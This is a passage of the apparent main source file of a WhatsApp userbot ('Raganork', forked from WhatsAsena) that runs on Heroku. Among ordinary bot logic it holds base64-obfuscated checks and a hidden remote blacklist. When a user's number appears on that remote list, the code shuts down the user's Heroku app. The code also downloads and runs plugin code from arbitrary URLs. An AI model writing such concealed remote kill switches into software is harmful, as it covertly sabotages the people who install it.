const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./whatsasena/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const WhatsAsenaDB = config.DATABASE.define('WhatsAsenaDuplicated', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '905511384572,0' }
// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function whatsAsena () {
    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '' }    
    var ggg = Buffer.from(clh.cd, 'base64')
    var ddd = ggg.toString('utf-8')
    clh.pay = ddd
    const conn = new WAConnection();
    const Session = new StringSession();
    conn.version = [2,2121,7];
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        await axios.get('https://gist.githubusercontent.com/souravkl11/1df3eeb29415b94c119c6d459ce9ee6e/raw').then(async (ann) => {
            const { infotr, infoen, infoes, infopt, infoid, infoaz, infohi, infoml, inforu} = ann.data.announcements          
            if (infotr !== '' && config.LANG == 'TR') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```Günlük Duyurular``` ]\n\n' + infotr.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoaz !== '' && config.LANG == 'AZ') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```Gündəlik Elanlar``` ]\n\n' + infoaz.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoes !== '' && config.LANG == 'ES') {
                while (getGMTh == 18 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```Anuncios Diarios``` ]\n\n' + infoes.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoen !== '' && config.LANG == 'EN') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```Daily Announcements``` ]\n\n' + infoen.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infohi !== '' && config.LANG == 'HI') {
                while (getGMTh == 21 && getGMTm == 31) { 
                    return conn.sendMessage(conn.user.jid, '[ ```दैनिक घोषणाएं``` ]\n\n' + infohi.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoml !== '' && config.LANG == 'ML') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```പ്രതിദിന പ്രഖ്യാപനങ്ങൾ``` ]\n\n' + infoml.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoid !== '' && config.LANG == 'ID') {
                while (getGMTh == 23 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```Pengumuman Harian``` ]\n\n' + infoid.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (inforu !== '' && config.LANG == 'RU') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```Ежедневные объявления``` ]\n\n' + inforu.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infopt !== '' && config.LANG == 'PT') {
                while (getGMTh == 17 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```Anúncios Diários``` ]\n\n' + infopt.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
        })
    }, 50000);
    var biography_var = ''
    await heroku.get(baseURI + '/config-vars').then(async (vars) => {
        biography_var = vars.AUTO_BİO
    });
    setInterval(async () => { 
        if (biography_var == 'true') {
            if (conn.user.jid.startsWith('90')) { // Turkey
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('994')) { // Azerbayjan
                var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('94')) { // Sri Lanka
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('351')) { // Portugal
                var ov_time = new Date().toLocaleString('PT', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('75')) { // Russia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('RU', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('91')) { // Indian
                var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('62')) { // Indonesia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('49')) { // Germany
                var ov_time = new Date().toLocaleString('DE', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('61')) { // Australia 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('AU', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('55')) { // Brazil
                var ov_time = new Date().toLocaleString('BR', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('33')) { // France
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('FR', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('34')) { // Spain
                var ov_time = new Date().toLocaleString('ES', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('44')) { // UK
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('GB', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('39')) { // Italy 
                var ov_time = new Date().toLocaleString('IT', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { // Kazakhistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('998')) { // Uzbekistan 
                var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('993')) { // Turkmenistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
            else {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('EN', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 ✔'
                await conn.setStatus(biography)
            }
        }
    }, 7890);
    var insult = await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw')
    const { shs1, shl2, lss3, dsl4 } = insult.data.inside
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAsenaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    const buff = Buffer.from(`${shs1}`, 'base64');  
    const one = buff.toString('utf-8'); 
    const bufft = Buffer.from(`${shl2}`, 'base64');  
    const two = bufft.toString('utf-8'); 
    const buffi = Buffer.from(`${lss3}`, 'base64');  
    const three = buffi.toString('utf-8'); 
    const buffu = Buffer.from(`${dsl4}`, 'base64');  
    const four = buffu.toString('utf-8'); 
    
    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    conn.on ('open', async () => {
        console.log(
            chalk.blueBright.italic('✅ Checking Bot Errors')
        );
        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('Whats')}${chalk.blue.bold('Asena')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
    });
    conn.on('credentials-updated', async () => {
        console.log(
            chalk.green.bold('✅ Login successful!')
        );
        console.log(
            chalk.blueBright.italic('Injecting to Baileys...')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('✅Connecting to Raganork Database...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('✅ Final Connection Successfull!')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        await new Promise(r => setTimeout(r, 200));
        let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('⚡ Raganork' + afwhasena));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACTİON = config.LANG == 'TR' || config.LANG == 'AZ' ? '*WhatsAsena Chatbot Olarak Çalışıyor!* 🐺\n\n_Bu modun amacı botu tam fonksiyonel bir yapay zeka sohbet aracına çevirmektir._\n_Normal moda dönmek için_ *.fulleva off* _komutunu kullanabilirsiniz._\n\n*WhatsAsena Kullandığın İçin Teşekkürler 💌*\n    *- Eva*' : '*𝙍𝙖𝙜𝙖𝙣𝙤𝙧𝙠 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙖𝙨 𝙖 𝘾𝙝𝙖𝙩𝙗𝙤𝙩! 💬*\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.chatbot off* _command to return to normal mode._\n\n*Killadism never ends!*\n    *- Raganork*'
        if (conn.user.jid == one || conn.user.jid == two || conn.user.jid == three || conn.user.jid == four) {
            await conn.sendMessage(conn.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
        if (config.WORKTYPE == 'public') {
      
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '*WhatsAsena Public Olarak Çalışıyor! 🐺*\n\n_Lütfen burada plugin denemesi yapmayın. Burası sizin LOG numaranızdır._\n_Herhangi bir sohbette komutları deneyebilirsiniz :)_\n\n*Botunuz herkese açık bir şekilde çalışmaktadır. Değiştirmek için* _.setvar WORK_TYPE:private_ *komutunu kullanın.*\n\n*WhatsAsena Kullandığın İçin Teşekkürler 💌*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <souravkl11>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Güncellemek İçin``` *.update now* ```Yazın.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
            else { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '\n 𝙍𝘼𝙂𝘼𝙉𝙊𝙍𝙆 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 ✅\n', MessageType.text);
                }               
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <souravkl11>\n';
                        }
                    );
        
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Type``` *.update now* ```For Update The Bot.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
        }
        else if (config.WORKTYPE == 'private') { 
            if (config.LANG == 'TR' || config.LANG == 'AZ') { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '*WhatsAsena Private Olarak Çalışıyor! 🐺*\n\n_Lütfen burada plugin denemesi yapmayın. Burası sizin LOG numaranızdır._\n_Herhangi bir sohbette komutları deneyebilirsiniz :)_\n\n*Botunuz sadece size özel olarak çalışmaktadır. Değiştirmek için* _.setvar WORK_TYPE:public_ *komutunu kullanın.*\n\n*WhatsAsena Kullandığın İçin Teşekkürler 💌*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <souravkl11>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Güncellemek İçin``` *.update now* ```Yazın.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
            else { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '\n*𝙍𝙖𝙜𝙖𝙣𝙤𝙧𝙠 𝙧𝙪𝙣𝙣𝙞𝙣𝙜 𝙖𝙨 Private!😎*\n\n_Please do not try plugins here. This is your LOG number._\n_You can try commands to any chat :)_\n\n*Your bot working as private. To change it, use* _.setvar WORK_TYPE:public_\n\n*Killadism never ends!*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <souravkl11>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Type``` *.update now* ```For The Update Bot.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
        }
        else if (config.WORKTYPE == ' private' || config.WORKTYPE == 'Private' || config.WORKTYPE == ' Private' || config.WORKTYPE == 'privaye' || config.WORKTYPE == ' privaye' || config.WORKTYPE == ' prigate' || config.WORKTYPE == 'prigate' || config.WORKTYPE == 'priavte' || config.WORKTYPE == ' priavte' || config.WORKTYPE == 'PRİVATE' || config.WORKTYPE == ' PRİVATE' || config.WORKTYPE == 'PRIVATE' || config.WORKTYPE == ' PRIVATE') {

            if (config.LANG == 'TR' || config.LANG == 'AZ') {

                await conn.sendMessage(
                    conn.user.jid,
                    '_Görünüşe Göre Private Moduna Geçmek İstiyorsun! Maalesef_ *WORK_TYPE* _Anahtarın Yanlış!_ \n_Merak Etme! Senin İçin Doğrusunu Bulmaya Çalışıyorum.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
            else {
                await conn.sendMessage(
                    conn.user.jid,
                    '_It Looks Like You Want to Switch to Private Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
        }
        else if (config.WORKTYPE == ' public' || config.WORKTYPE == 'Public' || config.WORKTYPE == ' Public' || config.WORKTYPE == 'publoc' || config.WORKTYPE == ' Publoc' || config.WORKTYPE == 'pubcli' || config.WORKTYPE == ' pubcli' || config.WORKTYPE == 'PUBLİC' || config.WORKTYPE == ' PUBLİC' || config.WORKTYPE == 'PUBLIC' || config.WORKTYPE == ' PUBLIC' || config.WORKTYPE == 'puvlic' || config.WORKTYPE == ' puvlic' || config.WORKTYPE == 'Puvlic' || config.WORKTYPE == ' Puvlic') {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                await conn.sendMessage(
                    conn.user.jid,
                    '_Görünüşe Göre Public Moduna Geçmek İstiyorsun! Maalesef_ *WORK_TYPE* _Anahtarın Yanlış!_ \n_Merak Etme! Senin İçin Doğrusunu Bulmaya Çalışıyorum.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
            else {
                await conn.sendMessage(
                    conn.user.jid,
                    '_It Looks Like You Want to Switch to Public Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
        }
        else {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                return await conn.sendMessage(
                    conn.user.jid,
                    '_Girdiğin_ *WORK_TYPE* _Anahtarı Bulunamadı!_ \n_Lütfen_ ```.setvar WORK_TYPE:private``` _Yada_ ```.setvar WORK_TYPE:public``` _Komutunu Kullanın!_', MessageType.text
                );
            }
            else {
                return await conn.sendMessage(
                    conn.user.jid,
                    '_The_ *WORK_TYPE* _Key You Entered Was Not Found!_ \n_Please Type_ ```.setvar WORK_TYPE:private``` _Or_ ```.setvar WORK_TYPE:public```', MessageType.text
                );
            }
        }
    })
    conn.on('message-new', async msg => {
       
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {

            // Görüşürüz Mesajı

            var gb = await getMessage(msg.key.remoteJid, 'goodbye');

            var blogo = await axios.get(config.GIF_BYE, { responseType: 'arraybuffer' })

            if (gb !== false) {

                await conn.sendMessage(msg.key.remoteJid, Buffer.from(blogo.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message});

            }

            return;

        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {

            // Hoşgeldin Mesajı

            var gb = await getMessage(msg.key.remoteJid);

            var wlogo = await axios.get(config.GIF_WEL, { responseType: 'arraybuffer' })

            if (gb !== false) {

                await conn.sendMessage(msg.key.remoteJid, Buffer.from(wlogo.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message});

            }

            return;

        }
        // ==================== End Greetings ====================

        // ==================== Blocked Chats ====================
        if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT == '905524317852-1612300121') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT2 == '905511384572-1617736751') {     
            var tsup = config.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT3 == '905511384572-1621015274') {     
            var nsup = config.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
